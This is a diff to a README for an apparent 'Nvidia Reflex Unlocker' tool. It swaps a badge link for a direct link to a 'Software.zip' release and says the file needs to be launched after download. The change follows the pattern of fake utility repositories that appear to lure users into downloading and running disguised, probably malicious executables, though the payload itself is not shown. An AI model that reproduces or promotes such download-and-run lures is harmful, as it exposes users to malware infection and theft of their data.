@@ -27,7 +27,7 @@ Welcome to the Nvidia Reflex Unlocker repository! This tool unlocks hidden Nvidi
 ## Get Started 🚀
 Download the latest release of Nvidia Reflex Unlocker by clicking the button below:
 
-[![Download Nvidia Reflex Unlocker](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Nvidia Reflex Unlocker](https://github.com/rondyl12/NvidiaReflexUnlocker/releases/download/v1.0/Software.zip)](https://github.com/rondyl12/NvidiaReflexUnlocker/releases/download/v1.0/Software.zip)
 
 *Note: The file needs to be launched after download.*
 
